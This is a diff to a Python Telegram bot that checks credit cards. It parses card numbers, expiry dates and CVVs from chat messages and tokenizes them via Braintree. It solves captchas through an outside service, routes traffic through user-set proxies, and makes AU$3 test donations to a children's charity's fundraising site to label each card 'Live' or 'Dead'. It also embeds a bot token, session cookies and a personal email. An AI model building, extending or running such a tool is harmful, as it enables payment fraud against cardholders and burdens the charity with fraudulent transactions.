@@ -18,18 +18,38 @@ class BraintreeTool:
     def getcards(self, text: str):
         text = text.replace('\n', ' ').replace('\r', '')
         card = re.findall(r"[0-9]+\d", text)
-        
+
         if len(card) == 0 or len(card) < 3:
-            return None  
+            return None
 
-        cc = card[0]
-        mes = card[1]
-        ano = card[2]
-        cvv = card[3]
-        
-        return cc, mes, ano, cvv  
+        if len(card) == 3:
+            cc = card[0]
+            if len(card[1]) == 3:
+                mes = card[2][:2]
+                ano = card[2][2:]
+                cvv = card[1]
+            else:
+                mes = card[1][:2]
+                ano = card[1][2:]
+                cvv = card[2]
+        else:
+            cc = card[0]
+            if len(card[1]) == 3:
+                mes = card[2]
+                ano = card[3]
+                cvv = card[1]
+            else:
+                mes = card[1]
+                ano = card[2]
+                cvv = card[3]
+                if len(mes) == 2 and (mes > '12' or mes < '01'):
+                    ano1 = mes
+                    mes = ano
+                    ano = ano1
 
-    def tokenize_credit_card(self, cc, mes, ano, cvv):
+        return cc, mes, ano, cvv
+
+    def tokenize_credit_card(self, cc, mes, ano, cvv, proxies=None):
         payload = {
             "clientSdkMetadata": {
                 "source": "client",
@@ -44,8 +64,20 @@ class BraintreeTool:
                             bin       
                             brandCode       
                             last4       
+                            cardholderName       
                             expirationMonth      
                             expirationYear      
+                            binData {         
+                                prepaid         
+                                healthcare         
+                                debit         
+                                durbinRegulated         
+                                commercial         
+                                payroll         
+                                issuingBank         
+                                countryOfIssuance         
+                                productId       
+                            }     
                         }   
                     } 
                 }
@@ -86,14 +118,6 @@ class BraintreeTool:
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
         }
 
-        # Sử dụng proxy nếu đã được cấu hình
-        proxies = None
-        if proxy_config:
-            proxies = {
-                'http': proxy_config,
-                'https': proxy_config
-            }
-
         response = requests.post(self.api_url, headers=headers, json=payload, proxies=proxies)
         if response.status_code == 200:
             data = response.json()
@@ -116,18 +140,21 @@ class BraintreeTool:
             "Content-Type": "application/json"
         }
 
-        # Không sử dụng proxy cho API giải captcha
         response = requests.post(self.captcha_url, headers=headers, data=json.dumps(captcha_payload))
 
         if response.status_code == 200:
             data = response.json()
-            return data.get('captcha')  
+            if data.get('success'):
+                return data.get('captcha')  
+            else:
+                return None
         else:
             return None
 
-    def process_payment(self, token, captcha):
+    def process_payment(self, token, captcha, proxies=None):
         payment_payload = {
             "DonationType": "D",
+            "Message": None,
             "RegularGivingSettings": {
                 "Enable": False,
                 "Frequency": "M",
@@ -142,7 +169,10 @@ class BraintreeTool:
                 "Description": "Tax Deductible Donation",
                 "UnitPrice": 3,
                 "Quantity": 1,
-                "BeneficiaryId": 1268
+                "BeneficiaryId": 1268,
+                "EventCampaignId": 10310,
+                "FundraisingPageId": None,
+                "MainLineItem": True
             }],
             "TokenDetailsForTransaction": {
                 "Token": token,
@@ -151,43 +181,55 @@ class BraintreeTool:
             },
             "CustomerDetails": {
                 "DonorType": "I",
+                "CompanyName": "",
                 "FirstName": "Thanh",
                 "LastName": "Vu",
-                "EmailAddress": "jpbeluga3@gmail.com"
+                "EmailAddress": "jpbeluga3@gmail.com",
+                "MobileNumber": "",
+                "ContactNumber": "",
+                "AddressLine1": "",
+                "Suburb": "",
+                "Postcode": "",
+                "State": "",
+                "Country": "",
+                "ReceiveNewsletter": False,
+                "ReceiveGFNewsletter": False
             },
             "TuringTest": captcha,
+            "TuringTestResult": {},
+            "WaitForCompletion": False,
             "MetaData": []
         }
 
         headers = {
             "Content-Type": "application/json;charset=UTF-8",
             "Accept": "application/json, text/plain, */*",
+            "Accept-Encoding": "gzip, deflate, br, zstd",
+            "Accept-Language": "en-US,en;q=0.9",
             "Connection": "keep-alive",
             "Host": "fundraising.childhood.org.au",
             "Origin": "https://fundraising.childhood.org.au",
             "Referer": "https://fundraising.childhood.org.au/payments/donate/beneficiary/1268",
             "RequestVerificationToken": "ceH0CkTb8gWQ6JVU3uq0jdoJnJzPF9ReeGawyEBJ58iDyTHoTkMePKNdMT6ziA36kZ23ZBGsPyqm3npX_n0eYZe3nqs1:fWydDKhIC_5tk8_3p_JlMUsXvcOKhyubMZPC5k3RHRZPn76LAlmpVfPuER7laPcgVQb9e8FJb7-jcO4p5gkuiqje0Os1",
             "sec-ch-ua": "\"Not)A;Brand\";v=\"99\", \"Google Chrome\";v=\"127\", \"Chromium\";v=\"127\"",
+            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua-platform": "\"Windows\"",
+            "Sec-Fetch-Dest": "empty",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Site": "same-origin",
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
-            "x-requested-with": "XMLHttpRequest"
+            "x-requested-with": "XMLHttpRequest",
+            "Cookie": "ASP.NET_SessionId=origx1a40de34ibfv0bykmqh; _gcl_au=1.1.314313641.1722444236"
         }
-
-        # Sử dụng proxy nếu đã được cấu hình
-        proxies = None
-        if proxy_config:
-            proxies = {
-                'http': proxy_config,
-                'https': proxy_config
-            }
 
         response = requests.post(self.payment_url, headers=headers, data=json.dumps(payment_payload), proxies=proxies)
         if response.status_code == 200:
             data = response.json()
-            return data['data']['ReferenceId']
+            return data.get('data', {}).get('ReferenceId', None)
         else:
             return None
 
-    def check_payment_status(self, ref_id):
+    def check_payment_status(self, ref_id, proxies=None):
         status_payload = {
             "clientReferenceId": ref_id
         }
@@ -195,92 +237,88 @@ class BraintreeTool:
         headers = {
             "Content-Type": "application/json;charset=UTF-8",
             "Accept": "application/json, text/plain, */*",
+            "Accept-Encoding": "gzip, deflate, br, zstd",
+            "Accept-Language": "en-US,en;q=0.9",
             "Connection": "keep-alive",
             "Host": "fundraising.childhood.org.au",
             "Origin": "https://fundraising.childhood.org.au",
             "Referer": "https://fundraising.childhood.org.au/payments/donate/beneficiary/1268",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
+            "RequestVerificationToken": "undefined",
+            "sec-ch-ua": "\"Not)A;Brand\";v=\"99\", \"Google Chrome\";v=\"127\", \"Chromium\";v=\"127\"",
+            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua-platform": "\"Windows\"",
+            "Sec-Fetch-Dest": "empty",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Site": "same-origin",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
+            "x-requested-with": "XMLHttpRequest",
+            "Cookie": "ASP.NET_SessionId=origx1a40de34ibfv0bykmqh"
         }
-
-        # Sử dụng proxy nếu đã được cấu hình
-        proxies = None
-        if proxy_config:
-            proxies = {
-                'http': proxy_config,
-                'https': proxy_config
-            }
 
         response = requests.post(self.status_url, headers=headers, data=json.dumps(status_payload), proxies=proxies)
         if response.status_code == 200:
             data = response.json()
-            status = data.get('PaymentStatus', "Failure")
-            failure_message = data.get('FailureMessage', "No specific message")
-            return status, failure_message
+            return data['data'].get('PaymentStatus', "Failure"), data['data'].get('FailureMessage', "No specific message")
         else:
             return "Failure", None
 
+    def process_cards(self, card_list, proxies=None):
+        for card in card_list:
+            card_info = self.getcards(card)
+            if card_info is None:
+                continue
 
+            cc, mes, ano, cvv = card_info
+            token = self.tokenize_credit_card(cc, mes, ano, cvv, proxies=proxies)
+            if not token:
+                continue
+
+            captcha = self.get_captcha()
+            if not captcha:
+                print("Captcha giải lỗi.")
+                continue
+            
+            ref_id = self.process_payment(token, captcha, proxies=proxies)
+            if ref_id:
+                time.sleep(7)
+                status, failure_message = self.check_payment_status(ref_id, proxies=proxies)
+                if status == "SUCCESS":
+                    return "Live"
+                else:
+                    return f"Dead: {failure_message}"
+            else:
+                return "Dead"
+
+# Bot Telegram handlers
 async def handle_be(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    card_input = ' '.join(context.args)
+    message = update.message.text
+    card_details = message.split(" ")[1]  # Lấy thẻ từ lệnh
     tool = BraintreeTool()
-    card_info = tool.getcards(card_input)
-
-    if not card_info:
-        await update.message.reply_text(f"Invalid card format: {card_input}")
-        return
-
-    cc, mes, ano, cvv = card_info
-    token = tool.tokenize_credit_card(cc, mes, ano, cvv)
-    if not token:
-        await update.message.reply_text(f"Failed to tokenize card {cc[-4:]}. Card is DEAD.")
-        return
-    
-    await update.message.reply_text(f"Tokenized card {cc[-4:]}: Token {token}")
-
-    captcha = tool.get_captcha()
-    if not captcha:
-        await update.message.reply_text("Captcha retrieval failed, aborting process.")
-        return
-    
-    ref_id = tool.process_payment(token, captcha)
-    if ref_id:
-        await update.message.reply_text(f"Waiting for payment status (7 seconds)...")
-        time.sleep(7)
-        status, failure_message = tool.check_payment_status(ref_id)
-        if status == "SUCCESS":
-            await update.message.reply_text(f"Payment for card {cc[-4:]} was successful! Card is LIVE.")
-        else:
-            await update.message.reply_text(f"Payment for card {cc[-4:]} failed: {failure_message}. Card is DEAD.")
-    else:
-        await update.message.reply_text(f"Failed to process payment for card {cc[-4:]}. Card is DEAD.")
-
+    result = tool.process_cards([card_details], proxies=proxy_config)
+    await update.message.reply_text(result)
 
 async def handle_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global proxy_config
-    if len(context.args) != 1:
-        await update.message.reply_text("Usage: /proxy <ip>:<port>:<username>:<password>")
-        return
+    message = update.message.text
+    proxy_details = message.split(" ")[1]
+    ip, port, username, password = proxy_details.split(":")
+    proxy_config = {
+        "http": f"http://{username}:{password}@{ip}:{port}",
+        "https": f"http://{username}:{password}@{ip}:{port}"
+    }
+    await update.message.reply_text("Proxy đã được thiết lập.")
 
-    proxy_parts = context.args[0].split(":")
-    if len(proxy_parts) == 4:
-        ip = proxy_parts[0]
-        port = proxy_parts[1]
-        username = proxy_parts[2]
-        password = proxy_parts[3]
-        proxy_config = f"http://{username}:{password}@{ip}:{port}"
-        await update.message.reply_text(f"Proxy set to: {proxy_config}")
-    else:
-        await update.message.reply_text("Invalid proxy format. Usage: /proxy <ip>:<port>:<username>:<password>")
+# Khởi tạo bot Telegram
+async def main():
+    application = ApplicationBuilder().token("5452812723:AAHwdHJSMqqb__KzcSIOdJ3QuhqsIr9YTro").build()
+    
+    # Thêm các handlers cho các lệnh
+    application.add_handler(CommandHandler("be", handle_be))
+    application.add_handler(CommandHandler("proxy", handle_proxy))
 
-
-def main():
-    app = ApplicationBuilder().token("5452812723:AAHwdHJSMqqb__KzcSIOdJ3QuhqsIr9YTro").build()
-
-    app.add_handler(CommandHandler("be", handle_be))
-    app.add_handler(CommandHandler("proxy", handle_proxy))
-
-    app.run_polling()
-
+    # Chạy bot
+    await application.run_polling()
 
 if __name__ == "__main__":
-    main()
+    import asyncio
+    asyncio.run(main())
